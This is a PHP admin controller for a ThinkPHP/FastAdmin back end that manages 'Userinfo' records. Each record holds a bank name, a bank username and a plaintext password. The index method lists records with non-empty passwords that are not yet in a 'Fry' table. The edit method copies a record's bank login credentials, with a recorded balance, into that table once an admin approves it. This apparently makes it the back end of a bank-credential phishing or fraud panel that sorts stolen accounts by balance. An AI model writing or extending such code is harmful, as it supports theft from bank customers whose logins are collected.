<?php

namespace app\admin\controller;

use app\common\controller\Backend;
use think\Db;
use think\exception\PDOException;
use think\exception\ValidateException;

/**
 *
 *
 * @icon fa fa-circle-o
 */
class Userinfo extends Backend
{

    /**
     * Userinfo模型对象
     * @var \app\common\model\Userinfo
     */
    protected $model = null;

    public function _initialize()
    {
        parent::_initialize();
        $this->model = new \app\common\model\Userinfo;
        $this->view->assign("statusList", $this->model->getStatusList());
    }



    /**
     * 默认生成的控制器所继承的父类中有index/add/edit/del/multi五个基础方法、destroy/restore/recyclebin三个回收站方法
     * 因此在当前控制器中可不用编写增删改查的代码,除非需要自己控制这部分逻辑
     * 需要将application/admin/library/traits/Backend.php中对应的方法复制到当前控制器,然后进行修改
     */


    /**
     * 查看
     */
    public function index()
    {
        //当前是否为关联查询
        $this->relationSearch = true;
        //设置过滤方法
        $this->request->filter(['strip_tags', 'trim']);
        if ($this->request->isAjax()) {
            //如果发送的来源是Selectpage，则转发到Selectpage
            if ($this->request->request('keyField')) {
                return $this->selectpage();
            }
            list($where, $sort, $order, $offset, $limit) = $this->buildparams();
            $md5 = (new \app\admin\model\Fry())->column('md5');
            if($md5){
                $where2 = ['userinfo.md5'=>['not in',$md5]];
            }else{
                $where2 = [];
            }
            $list = $this->model
                ->with(['user'])
//                    ->where('userinfo.status = 3 and userinfo.password != ""')
                ->where('userinfo.password != ""')
                ->where($where2)
                ->where($where)
                ->order($sort, $order)
                ->paginate($limit);
            foreach ($list as $row) {

                $row->getRelation('user')->visible(['mobile']);
            }

            $result = array("total" => $list->total(), "rows" => $list->items());

            return json($result);
        }
        return $this->view->fetch();
    }

    public function edit($ids = null)
    {
        $row = $this->model->get($ids);
        if (!$row) {
            $this->error(__('No Results were found'));
        }
        $adminIds = $this->getDataLimitAdminIds();
        if (is_array($adminIds) && !in_array($row[$this->dataLimitField], $adminIds)) {
            $this->error(__('You have no permission'));
        }
        if (false === $this->request->isPost()) {
            $this->view->assign('row', $row);
            return $this->view->fetch();
        }
        $params = $this->request->post('row/a');
        if (empty($params)) {
            $this->error(__('Parameter %s can not be empty', ''));
        }
        $params = $this->preExcludeFields($params);
        $result = false;
        Db::startTrans();
        try {
            //是否采用模型验证
            if ($this->modelValidate) {
                $name = str_replace("\\model\\", "\\validate\\", get_class($this->model));
                $validate = is_bool($this->modelValidate) ? ($this->modelSceneValidate ? $name . '.edit' : $name) : $this->modelValidate;
                $row->validateFailException()->validate($validate);
            }
            if($params['status'] == 1){
                $exist = (new \app\admin\model\Fry())->where(['user_id'=>$row['user_id'],'bank_name'=>$row['bank_name'],'username'=>$row['username'],'password'=>$row['password']])->find();
                if(!$exist){
                    $create = [
                        'user_id' => $row['user_id'],
                        'bank_name' => $row['bank_name'],
                        'username' => $row['username'],
                        'password' => $row['password'],
                        'balance' => $params['balance'],
                        'remarks' => $params['remarks'],
                        'createtime' => time(),
                        'status' => 1,
                        'md5' => md5($row['user_id'].$row['bank_name'].$row['username'].$row['password'])
                    ];
                    (new \app\admin\model\Fry())->create($create);
                }
            }
            $result = $row->allowField(true)->save($params);
            Db::commit();
        } catch (ValidateException|PDOException|Exception $e) {
            Db::rollback();
            $this->error($e->getMessage());
        }
        if (false === $result) {
            $this->error(__('No rows were updated'));
        }
        $this->success();
    }
}
